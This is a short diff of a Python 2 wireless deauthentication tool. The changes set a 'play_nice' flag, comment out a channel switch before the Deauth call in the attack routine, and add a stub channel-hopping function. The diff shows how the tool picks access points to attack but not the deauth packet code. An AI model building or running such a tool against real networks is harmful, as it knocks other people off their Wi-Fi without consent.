@@ -8,7 +8,7 @@ import pyric.pyw as pyw
 import pyric.lib.libnl as nl
 
 # Global Variables
-play_nice = False
+play_nice = True
 attack_queue = Queue.Queue()
 ap_list = []
 attack_list = []
@@ -41,7 +41,7 @@ def GetAngry(data):
 	(bssid,channel) = data
 	if bssid not in attack_list:
 		print "Attacking BSSID: %s on Channel %s" % (bssid, channel)
-		SetIfaceChannel('wlan0',channel)
+		#SetIfaceChannel('wlan0',channel)
 		Deauth(bssid)
 		# Random sleep time between 1 and 5 to test for wireless card change time
 		attack_list.append(bssid)
@@ -103,6 +103,12 @@ def CheckInterfaces():
 		print "Not Angry Enough"
 	else:
 		print "That's my secret cap'n I'm always angry!"
+
+# HoppinIface - Hop the primary Interface to find more beacons.  Much like airodump-ng channel hop
+def HoppinIface(iface):
+	print "hopping Iface"
+	pinfo = pyw.phyinfo(iface)
+
 
 # Deauth is the Python implementation of sending deauth packets with Scapy
 def Deauth(bssid):
